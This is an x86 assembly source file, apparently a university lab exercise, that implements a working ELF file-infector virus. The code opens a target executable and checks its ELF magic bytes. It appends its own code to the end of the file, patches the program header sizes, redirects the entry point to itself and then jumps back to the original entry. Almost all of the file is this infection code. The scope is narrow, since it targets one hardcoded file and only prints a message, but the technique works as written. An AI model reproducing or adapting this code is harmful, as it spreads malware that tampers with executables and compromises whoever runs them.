%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24	;0x18
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define EHDR_size 52
%define firstInstruction_PHDR_load_address 0x08048000
%define SEEK_CUR 1	
	global _start

	section .text
_start:	
    push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
    ;get the OutStr address on runtime using get_my_loc
    call get_my_loc             
    mov ebx, next_i
    sub ebx, OutStr
    sub ecx, ebx        ;now ecx = the actual address of OutStr on runtime
    write 1, ecx, 31    ;write the OutStr string to stdout
   
   ;open the exec file
        call get_my_loc
		sub ecx, next_i-FileName
		mov dword [ebp-4], ecx
		open dword [ebp-4], RDWR, 0777
		cmp eax, 0
		jl exitWithError
   
   
   ;open FileName, RDWR, -1     ;call to open file ELFexec in RDWR mode. last arg is irrelevant
    ;----------stack indexes-------------------------------------------------------------------------------------------------------------------------------------------
    ;;;;;ebp-4= exec file name, ebp-8=file descriptor,ebp-12=magic number of elf file,ebp-16- size of file before,ebp-68=elf header ,ebp-72=previous entry point of ELFexec,ebp-104=program header, (ebp-104)-(ebp-72)=first program header, ebp-108=program header virtual address, ebp-140 second ph
    ;-------------------------------------------------------------------------------------------------------------------------------------------------------------------
    ;cmp dword eax, 0
   ; jl terminate            ;check if couldn't open the elf file
    mov [ebp-8], eax            ;get the file descriptor and store it in stack
    
    mov edi,ebp
    sub edi,12
    
    ;check it's elf file
    read [ebp-8],edi,4          ;read the 4 starting bytes in file header = 0x7f,e,l,f
    ;compare each char of them
    cmp byte [ebp-12], 0x7f 
    jne exitWithError
    cmp byte [ebp-11], 'E' 
    jne exitWithError
    cmp byte [ebp-10], 'L'
    jne exitWithError
    cmp byte [ebp-9], 'F'
    jne exitWithError
    
    ;add the virus at the end of the elf file
    lseek [ebp-8], 0, SEEK_END  ;go to point on the end of file and get its size in eax
    mov [ebp-16], eax   ;store the size of the file before the changes of writing
    
    
    ;calc the size to write;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    xor edx, edx
    xor ecx, ecx
    mov ecx, _start
	mov edx, virus_end
	sub edx, ecx
	xor edi,edi
	mov edi,edx    ;edi=size of virus
	
	call get_my_loc
    sub ecx, next_i-_start  ;ecx=_start address
	mov esi,ecx                ;esi=_start address
	
	write [ebp-8], esi, edi ;write the virus
    
    lseek [ebp-8], 0, SEEK_SET  ;move the pointer back to the start of the file
    
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    ;allocating space in stack for the elf header
    xor edi,edi ;zeroize edi
    mov edi, ebp
    sub edi, 16 ;pass the last allocated memory place in stack
    sub edi, EHDR_size  ;allocate enough space for the header (52 bytes as observed using readelf)
    
    ;copy elf header into stack
    read [ebp-8], edi, EHDR_size
   
    mov eax, [ebp-68+ENTRY] ;save the previous entry point
    mov [ebp-72], eax       ;store prev entry point in stack
    
   
   ;zeroize eax and ebx
    xor edi,edi
    xor ebx,ebx
  ;------------------------------------------------------------------------------------------------------
    ;point the fd to the program header
    mov ebx, [ebp-68+PHDR_start]   ;eax=program header's entry
    lseek [ebp-8], ebx, SEEK_SET    ;point to program header
    
    ;allocate space for the program header in stack
    mov edi, ebp
    sub edi,72                      ;pass the last allocated space in stack
    sub edi, PHDR_size
    read [ebp-8],edi,PHDR_size      ;read the program header into the stack in place ebp-72-32=ebp-104
    mov edi, [ebp-104+PHDR_vaddr]   ;get the virtual address of program header into edi
    mov esi, ebp
    sub esi, 108
    mov [esi], edi                  ;store the program header virt address in stack in [ebp-108]
    
    
;-----------------------------------------------------------------------------------------------------------
    xor edi, edi
    mov edi, ebp
    sub edi, 108                        ;go to the program headers
    sub edi, PHDR_size                  ; go to the second program header
  
  
  
    read [ebp-8], edi, PHDR_size         ; store the second ph in stack
    mov edi, [ebp-140+PHDR_offset]      ; edi = second PHDR_offset
    
    xor ecx,ecx
    xor edx,edx
    
    ;get the length of the virus code
    mov ecx, virus_end
    mov edx, _start
    sub ecx, edx
    
    add ecx, [ebp-16]                        ; ecx = virus.length + elfFile.length
    add dword [ebp-140+PHDR_filesize], ecx    ; update the file size of the program header with virus.length + elfFile.length
    add dword [ebp-140+PHDR_memsize], ecx     ; the same for ph memsize 
    lseek [ebp-8], -32, SEEK_CUR          ; point the fd to the second program header
    
    xor edi, edi
    mov edi, ebp
    sub edi, 108
    sub edi, PHDR_size                  ; ebx = ebp-108-32 = ebp-140
    write [ebp-8], edi, PHDR_size         ; exchange between the old second program header to the new one
    
    mov eax, [ebp-140+PHDR_vaddr]       ; get the 2nd ph's virt address
    add eax, [ebp-16]                    ; eax=second ph_virt addr+elf.length
    sub eax, [ebp-140+PHDR_offset]      ; eax=second ph virt address +elf.length - 2nd ph_offset
    
    
    
    mov [ebp-68+ENTRY], eax ;file header entry point is now the virus first instruction
    
    lseek [ebp-8], 0, SEEK_SET  ;move the pointer back to the start of the file
    
    xor edi, edi    ;zeroize edi
    ;point the elf header in the stack
    mov edi, ebp    
    sub edi, 68
    
    ;replace the elf header in the file with the infected one
    write [ebp-8], edi, EHDR_size
    
    ;replace last 4 bytes that represents entry point to jump to it
    lseek [ebp-8], -4,SEEK_END
    
    xor edi, edi
    mov edi, ebp
    sub edi, 72
    write [ebp-8], edi, 4
    
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    close [ebp-8]   ; close(fd)
    
    add esp, STK_RES;free allocated in stack
    mov esp, ebp    ;restore ebp
    pop ebp         ;restore ebp
    
    
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
terminate:
    call get_my_loc
    mov edx, next_i
    sub edx, prev_entry_point
    sub ecx, edx
    mov eax,0
    jmp [ecx]
        
    
exitWithError:

        call get_my_loc
        sub ecx, next_i-Failstr
        write 1, ecx, 12
        mov eax, 0x55
    
VirusExit:
       exit eax            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
;virus_end:
;get my loc function from class:
get_my_loc:
        call next_i
next_i:
        pop ecx
        ret
;;;
prev_entry_point: dd VirusExit
virus_end:
